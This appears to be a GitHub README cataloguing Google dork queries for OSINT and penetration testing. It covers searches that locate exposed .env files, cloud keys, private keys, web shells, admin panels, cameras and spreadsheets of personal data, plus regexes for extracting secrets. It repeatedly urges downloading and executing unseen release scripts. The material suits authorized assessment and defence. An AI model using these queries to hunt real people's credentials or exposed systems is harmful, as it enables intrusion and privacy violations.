# Awesome Google Dorks — Advanced Queries for OSINT & Security 🔎🛡️

[![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github)](https://github.com/zeinebHajRomdhane/awesome-google-dorks/releases)  
https://github.com/zeinebHajRomdhane/awesome-google-dorks/releases

Badges:  
[![cheat-sheet](https://img.shields.io/badge/cheat--sheet-lightgrey)](https://github.com/zeinebHajRomdhane/awesome-google-dorks/releases) [![cybersecurity](https://img.shields.io/badge/cybersecurity-red)](https://github.com/zeinebHajRomdhane/awesome-google-dorks/releases) [![osint](https://img.shields.io/badge/osint-orange)](https://github.com/zeinebHajRomdhane/awesome-google-dorks/releases) [![google-hacking](https://img.shields.io/badge/google--hacking-blueviolet)](https://github.com/zeinebHajRomdhane/awesome-google-dorks/releases) [![penetration-testing](https://img.shields.io/badge/penetration--testing-green)](https://github.com/zeinebHajRomdhane/awesome-google-dorks/releases)

![Cyber Search](https://images.unsplash.com/photo-1535223289827-42f1e9919769?auto=format&fit=crop&w=1200&q=60)

Table of contents
- What this repo contains
- Quick start
- Download and run
- Google search operators — cheat sheet
- Core dork categories
- Real-world examples and use cases
- OSINT workflows using dorks
- Penetration testing workflows
- Parsing, filtering, and automation
- Integrations with security tools
- Crafting safe, scoped dorks
- Building a private dork library
- Search ethics and rules for testing
- Contribution guide
- References and further reading
- License and credits

What this repo contains
- A curated list of Google dorks for information gathering.
- Categorized queries for files, configs, admin panels, cameras, credentials, and more.
- Practical usage notes and tuning tips for each class of dork.
- Example workflows for OSINT and penetration tests.
- Scripts and templates to parse search results and feed scanners.
- Release assets with compiled cheat-sheets and sample configs. Download and execute the release asset from the Releases page: https://github.com/zeinebHajRomdhane/awesome-google-dorks/releases

Quick start
- Use a modern browser or a Google Custom Search Engine (CSE).  
- Copy dorks from this repo into the query bar.  
- Scope searches with site:, inurl:, or domain filters.  
- Record findings and verify access with explicit permission.

Download and run
- Grab the release asset: https://github.com/zeinebHajRomdhane/awesome-google-dorks/releases  
- The release contains a cheat-sheet PDF, tooling scripts, and sample configs. Download the file and execute the included scripts in a safe environment.  
- Example local steps:
  1. Download the release archive.
  2. Extract to a working directory.
  3. Inspect scripts before running.
  4. Use a sandbox or virtual machine to run any automation scripts.
- The badge above links to the Releases page for direct download.

Google search operators — cheat sheet
- site:domain — limit results to a domain or host. Example: site:example.com
- inurl:word — match URLs that contain a word. Example: inurl:admin
- intitle:word — match page titles with a word. Example: intitle:"index of"
- intext:word — match page body text. Example: intext:"password"
- filetype:ext — match file extensions. Example: filetype:pdf
- cache: — access Google's cached copy.
- related:domain — find sites similar to domain.
- link: — pages that link to a URL.
- allinurl: words — require all words in URL.
- allintitle: words — require all words in title.
- allintext: words — require all words in text.
- OR — boolean OR operator. Example: inurl:admin OR inurl:login
- -term — exclude results that contain term. Example: -site:github.com

Short operator combos
- site:example.com inurl:wp-login.php
- filetype:env "DB_PASSWORD"
- intitle:"index of" /backup
- inurl:"/phpmyadmin/" OR inurl:"phpmyadmin"
- "site:amazonaws.com" "credentials" filetype:json

Core dork categories
1. Exposed files and backups
   - filetype:sql | filetype:bak | filetype:zip | filetype:gz
   - Example: filetype:sql "INSERT INTO" "wp_users"
   - Use to find database dumps, backups, archives.

2. Login and admin panels
   - inurl:admin | inurl:login | intitle:"Admin"
   - Example: inurl:admin intitle:"Dashboard"
   - Use to locate exposed admin pages and control panels.

3. Sensitive configuration files
   - filetype:env | filetype:config | filetype:ini
   - Example: filetype:env "DB_HOST" "DB_PASSWORD"
   - Use to find credentials, API keys, and secrets.

4. Cloud storage and buckets
   - site:storage.googleapis.com | site:s3.amazonaws.com | site:azureedge.net
   - Example: site:s3.amazonaws.com filetype:json "accessKey"
   - Use to find exposed buckets and bucket contents.

5. Logs and debug output
   - intext:"Stacktrace" | intext:"Exception"
   - Example: intitle:"Exception" intext:"at com."
   - Use to find leak of internal error messages or stack traces with sensitive paths.

6. Source code and config in public pages
   - intext:"api_key" | intext:"client_secret"
   - Example: intext:"private_key" filetype:json
   - Use to find hard-coded keys and tokens.

7. Exposed devices and cameras
   - inurl:viewerframe? | intitle:"Live View / - AXIS"
   - Example: inurl:/view/index.shtml "camera"
   - Use to find unsecured IoT devices and cameras.

8. Web shells and upload endpoints
   - inurl:cmd.php | inurl:upload.php
   - Example: inurl:shell.php OR inurl:cmd.php
   - Use to locate common web shells or risky upload endpoints.

9. Metadata and sensitive docs
   - filetype:pdf | filetype:docx | filetype:xls
   - Example: filetype:pdf "confidential" OR "internal use"
   - Use to detect exposed documents with sensitive metadata.

10. Financial and PII leaks
    - intext:"credit card" | filetype:xls "SSN"
    - Example: filetype:xls "Social Security" OR "SSN"
    - Use to find spreadsheets and forms that store personal data.

Real-world examples and use cases
- Scenario: Assessing a public web property (with permission)
  - Step 1: Map scope
    - site:target.com
    - site:*.target.com
  - Step 2: Find admin pages
    - site:target.com inurl:admin OR inurl:login
  - Step 3: Find backup files
    - site:target.com filetype:zip OR filetype:bak OR filetype:sql
  - Step 4: Check for exposed keys
    - site:target.com intext:"API_KEY" OR intext:"client_secret"
  - Use results to build a list of targets for authorized testing.

- Scenario: OSINT for a person or company
  - Search for documents that mention names or roles:
    - filetype:pdf "John Doe" "email"
  - Find public resumes or internal slides:
    - filetype:pptx "Company XYZ"
  - Look for leaked credentials:
    - intext:"password" site:pastebin.com OR site:github.com

- Scenario: Cloud asset discovery
  - AWS buckets hosting static sites:
    - site:s3.amazonaws.com "index of"
  - Misconfigured public blobs:
    - site:blob.core.windows.net "container"

Dork examples — grouped and annotated
- Files and backups
  - filetype:sql "INSERT INTO" "users"
  - filetype:zip "backup" "index of"
  - intitle:"index of" ".sql"

- Databases and credentials
  - filetype:env "DB_PASSWORD" -site:github.com
  - filetype:json "aws_access_key_id" OR "aws_secret_access_key"
  - intext:"mysql" "root" filetype:cnf

- Admin and control panels
  - inurl:phpmyadmin/ | inurl:wp-admin/ | inurl:administrator/
  - intitle:"Control Panel" "admin"

- Web frameworks and CMS
  - inurl:/wp-content/uploads/ filetype:php "eval("
  - inurl:administrator/index.php "Joomla"

- Development and debug output
  - intitle:"Debug" "Exception" intext:"Stack trace"
  - intext:"Traceback (most recent call last)"

- Git, SVN and source leaks
  - inurl:/.git/config filetype: -site:github.com
  - inurl:/.svn/entries

- IoT, DVR, camera
  - intitle:"webcam" OR intitle:"DVR"
  - inurl:view/view.shtml "camera"

- Misc sensitive content
  - filetype:xls "Payroll" OR "Salary"
  - "Confidential" filetype:pdf OR filetype:docx

OSINT workflows using dorks
- Target profiling
  - Start with broad company-level site: searches.
  - Expand to subdomains with site:*.company.com.
  - Use intext: and intitle: to extract public reports, presentations, and org charts.

- Credential discovery
  - Search for "password", "passwd", "credentials" across file types and hosts.
  - Cross-check findings with breach databases and public paste sites.

- Vendor and supply-chain checks
  - Search for references to vendor names inside partner sites.
  - Use site:vendor.com intext:"partner" OR "customer"

- Social engineering reconnaissance
  - Gather public documents with internal contacts and titles.
  - Collect job descriptions and contact patterns from job boards and PDFs.
  - Use information to plan scoped social tests.

Penetration testing workflows
- Recon phase
  - Use dorks to find entry points: admin, upload, panels.
  - Map exposed file types and accessible directories.

- Enumeration and validation
  - Use found URLs to probe for known software, versions, and misconfigurations.
  - Test only within agreed scope.

- Exploitation preparation
  - Build hardening checklist of discovered items: exposed backups, open panels, default credentials.
  - Create tickets for responsible disclosure or remediation.

- Reporting
  - Document each dork with the date, query, and links.
  - Include reproduction steps and suggested mitigations.

Parsing, filtering, and automation
- Export results manually into a CSV or spreadsheet.
  - Use copy/paste from the browser results.
  - Record title, URL, snippet, and date.

- Automate with Google Custom Search JSON API
  - Use the Custom Search API to run queries programmatically.
  - Respect query limits and API terms.

- Use headless browsers for richer scraping
  - Puppeteer or Playwright can fetch dynamic pages and yield richer content.
  - Avoid scraping Google SERPs at scale without proper credentials.

- Filter noise with additional operators
  - Exclude known noisy hosts: -site:facebook.com -site:twitter.com
  - Narrow to file types and exact phrases.

- Sample parsing pipeline (conceptual)
  - 1) Run query or API call.
  - 2) Normalize URLs.
  - 3) Filter by HTTP status (200).
  - 4) Fetch page and extract patterns (emails, keys).
  - 5) Store results in a database and label by severity.

Integrations with security tools
- Burp Suite
  - Use dork results to seed Burp Intruder or Scanner.
  - Crawl the target pages from the "Target" tab.

- Nmap and masscan
  - Use discovered hostnames to map open ports and services.
  - Combine DNS enumeration with dork results.

- Shodan
  - Cross-reference dork-discovered hosts with Shodan to find open ports and services.

- Amass, Subfinder
  - Use domains returned by dorks to expand subdomain lists.
  - Feed results into automated reconnaissance pipelines.

- GitHub and code search
  - Use dorks to find leaked code on GitHub using site:github.com and filetype: keywords.
  - Combine with GitHub code search to validate source leaks.

Crafting safe, scoped dorks
- Always restrict to an authorized scope.
  - Use site:company.com OR domain filters to prevent off-scope discovery.

- Combine negative filters to reduce noise.
  - -site:*.cdnprovider.net -site:aws.amazon.com

- Use precise phrases and file types to reduce false positives.
  - "DB_PASSWORD" filetype:env

- Favor manual review for high-risk hits.
  - Inspect any credential or secret before attempting to use it.

Building a private dork library
- Structure
  - /dorks
    - /files
    - /credentials
    - /admin-panels
    - /cloud
    - /iot
  - Each file contains labeled queries and short notes.

- Metadata per dork
  - Title
  - Query
  - Category
  - Risk level
  - False positive notes
  - Date tested

- Versioning
  - Keep the library in Git.
  - Tag releases with curated sets and sample scripts.

- Sharing and reuse
  - Use GitHub Releases (link above) for downloadable cheat-sheets and CSV exports: https://github.com/zeinebHajRomdhane/awesome-google-dorks/releases

High-value dorks — details and tuning tips
- Backup and DB dumps
  - Query:
    - filetype:sql "INSERT INTO" "users"
  - Tuning:
    - Add site: to focus on a domain.
    - Narrow by date ranges in Google Tools.

- Private keys and credentials
  - Query:
    - filetype:pem OR filetype:key "BEGIN RSA PRIVATE KEY"
  - Tuning:
    - Exclude public code hosts to reduce noise: -site:github.com

- Web application debug traces
  - Query:
    - intitle:"Application error" OR intext:"Stack trace"
  - Tuning:
    - Add known framework markers: intext:"Zend" OR intext:"Django"

- Admin console and panels
  - Query:
    - inurl:admin OR inurl:dashboard intitle:"login"
  - Tuning:
    - Combine with server fingerprinting to guess software.

- Exposed cameras and DVRs
  - Query:
    - inurl:/view/view.shtml OR intitle:"Live View" "camera"
  - Tuning:
    - Use country codes or ISP blocks to narrow geography.

- Cloud configuration leaks
  - Query:
    - site:amazonaws.com "credentials" OR "secret"
  - Tuning:
    - Add filetype:json to narrow bucket manifests or tools outputs.

Advanced operator patterns and recipes
- Combine site scope with filetype and phrase
  - site:target.com filetype:pdf "confidential"

- Use OR to broaden but control with parentheses
  - (inurl:admin OR inurl:dashboard) site:target.com

- Chain negative filters
  - filetype:log -site:github.com -site:pastebin.com

- Use exact phrase matching for secrets
  - intext:"PRIVATE_KEY" filetype:txt

- Use Google cached: to access a historical copy
  - cache:target.com/page

Query tuning to reduce noise
- Remove popular hosts and CDNs:
  - -site:github.com -site:cdn.cloudflare.net -site:googleusercontent.com

- Limit to specific inurl patterns:
  - allinurl: /backup db backup

- Exclude test and dev environments:
  - -inurl:staging -inurl:dev -inurl:test

Tools and scripts (conceptual)
- dork-runner.sh (bash)
  - Accepts a list of dorks.
  - Queries Google Custom Search API.
  - Saves JSON results to a file.
  - Example flow (pseudocode):
    - for query in dork_list; do call_api(query) >> results.json; done

- dork-parse.py (python)
  - Reads results JSON.
  - Extracts URLs and snippets.
  - Filters by regex patterns for keys, emails, and phone numbers.
  - Stores outputs to SQLite.

- dork-scan.yaml (config for scan manager)
  - A list of query categories and scanning options.
  - Used by internal tools to prioritize targets.

Regex and patterns to extract secrets
- Emails: [a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}
- AWS Access Key ID: AKIA[0-9A-Z]{16}
- AWS Secret Access Key: (?i)[A-Za-z0-9/+=]{40}
- Generic API keys: [A-Za-z0-9_\-]{20,}

Example automated parsing (conceptual)
- Run dork via API -> get JSON -> extract URLs -> fetch page -> run regex -> tag hits -> save to DB.

Search engine alternatives and complements
- Bing advanced operators have different syntax but similar power.
- DuckDuckGo and Startpage offer privacy-focused alternatives.
- Shodan and Censys index device-level metadata, useful for IoT and exposed services.

Common pitfalls and false positives
- Public code forks and mirrors often show up for sensitive dorks.
- Large CDNs may host many files that match filetype filters.
- Old backup files may return stale data with no access risk.
- Dorks may return results blocked by robots.txt or authentication.

Safe handling of sensitive findings
- Record exact query and URL.
- Do not attempt to use credentials.
- Report through authorized channels or a defined disclosure program.
- Remove local copies of sensitive files from public places.

Contribution guide
- Add dorks as new files under /dorks with metadata header:
  - title: Short title
  - query: actual dork
  - category: e.g., files, cloud, iot
  - risk: low/medium/high
  - notes: FP tuning
- Submit a PR with test results and sample output.
- Tag PRs that add tooling with a short README for usage.

Release artifacts
- Each release includes:
  - curated-dorks.csv
  - cheat-sheet.pdf
  - sample scripts (dork-runner.sh, dork-parse.py)
  - config templates
- Downloadable from Releases: https://github.com/zeinebHajRomdhane/awesome-google-dorks/releases — download and execute the sample scripts according to the included instructions.

Example entries to add to the repo (template)
- Title: Exposed .env files
- Query: filetype:env "DB_PASSWORD" -site:github.com -site:gitlab.com
- Category: credentials
- Risk: High
- Notes: Check for API keys and rotate if found.

Search audit checklist (use when testing)
- Confirm scope and permission.
- Run shallow dorks to map surface.
- Narrow to file types and patterns for sensitive content.
- Validate each finding manually.
- Prepare findings with evidence and remediation steps.

Remediation tips for defenders
- Remove sensitive files from public web roots.
- Configure robots.txt and server rules to block directory listings.
- Rotate credentials found in public files.
- Enable least-privilege for cloud buckets and storage.
- Add monitors for keywords and filetypes to detect future leaks.

Sample report fragment (example format)
- Finding: Exposed backup archive
  - Query: site:target.com filetype:zip "backup"
  - Evidence: https://target.com/backups/2023-11-01.zip
  - Risk: High — contains database dump with user emails and hashed passwords
  - Suggested remediation:
    - Remove archive from public location.
    - Revoke exposed credentials.
    - Rotate keys and reset passwords if needed.

Legal and ethical use
- Use dorks for authorized assessments and OSINT with lawful scope.
- Respect privacy and data protection rules.
- Follow coordinated disclosure procedures when you find vulnerabilities or secrets.

References and further reading
- Google advanced search operators — official docs (search help pages)
- Open Web Application Security Project (OWASP) guides
- GHDB — Google Hacking Database
- Common Vulnerabilities and Exposures (CVE) for context on exploits

Images and assets
- Cover image: Unsplash cybersecurity photo above (free to use under Unsplash license).
- Badges: generated via img.shields.io.
- Use release assets for printable cheat-sheets and offline reference.

License and credits
- Content: CC BY-SA or your chosen open license in the repository.
- Tooling scripts: MIT or permissive license.
- Credit to contributors in the CONTRIBUTORS file.

How to cite or reference this repo in reports
- Use full repo name and include the release tag or date.
- Example:
  - Source: awesome-google-dorks — GitHub — release v1.0 (link to Releases)

Maintenance and roadmap
- Add new dorks for emerging platforms and cloud providers.
- Improve parsing scripts for new key formats.
- Add a web UI to manage and tag findings.
- Maintain the curated CSV and PDF cheat-sheets in each release.

Community and support
- Open issues for discussion and quality checks.
- Use pull requests for dork additions and tuning.
- Mention maintainers in PRs for faster review.

Quick reference — top 40 dorks (copyable)
- site:example.com inurl:admin
- site:example.com filetype:sql "INSERT INTO"
- filetype:env "DB_PASSWORD"
- filetype:json "aws_access_key_id"
- intitle:"index of" "backup"
- inurl:phpmyadmin OR inurl:pma
- filetype:git "repository"
- inurl:.git/config
- inurl:wp-login.php
- filetype:pem "BEGIN RSA PRIVATE KEY"
- site:s3.amazonaws.com "index of"
- filetype:pdf "confidential"
- intitle:"login" "administrator"
- intext:"api_key" filetype:txt
- "password" filetype:xls
- intext:"-----BEGIN PRIVATE KEY-----" filetype:txt
- inurl:/cgi-bin/ "test.cgi"
- intext:"Stack trace" "Exception"
- inurl:view/view.shtml "camera"
- filetype:pptx "internal use only"
- filetype:log "error" "Exception"
- inurl:upload.php "file"
- filetype:sql intext:"CREATE TABLE"
- intext:"client_secret" filetype:json
- filetype:bak "backup"
- inurl:/.env "APP_KEY"
- site:github.com "password" -in:issues
- inurl:admin intitle:"dashboard"
- intext:"aws_secret_access_key"
- filetype:csv "email" "password"
- inurl:phpinfo.php
- intitle:"phpinfo()"
- inurl:svn "entries"
- filetype:sql "DROP TABLE"
- filetype:db "sqlite"
- intext:"confidential" site:example.com
- filetype:xml "password"
- intext:"ssh-rsa" filetype:txt
- filetype:zip "backup" "password"

Contributing checklist
- Follow the dork template.
- Add tuning notes and false positive markers.
- Run the dork and add a sample hit if possible.
- Sign-off contributions with a short test log.

Frequently asked questions (FAQ)
- Q: How do I avoid Google rate limits?
  - A: Use the Google Custom Search JSON API and credentialed requests. Respect quota limits.
- Q: Can I use these dorks to find credentials?
  - A: You can locate potential secrets. Do not use them without permission.
- Q: How do I filter out public mirrors?
  - A: Add -site:github.com -site:gitlab.com and other known mirrors to the query.

Contact and reporting
- Use GitHub issues for bugs and false positives.
- Submit PRs to add or refine dorks.
- Use the Releases page to download curated sets and tooling: https://github.com/zeinebHajRomdhane/awesome-google-dorks/releases — download the release assets and inspect included scripts before executing them.

Contributors
- Maintainers and contributors appear in the CONTRIBUTORS file inside the repo.
- Credit community members for curated dorks and tooling.

Appendix — quick operator primer
- filetype:
- site:
- inurl:
- intitle:
- intext:
- cache:
- OR, -
- allinurl:, allintitle:, allintext:

Security note on automation
- Inspect scripts before running them.
- Use sandbox environments.
- Respect robot rules and API terms.

Repository topics
- cheat-sheet, cybersecurity, digital-forensics, ethical-hacking, exploit-db, google-dorks, google-hacking, information-gathering, osint, penetration-testing, security-tools, sensitive-data, web-security

End of file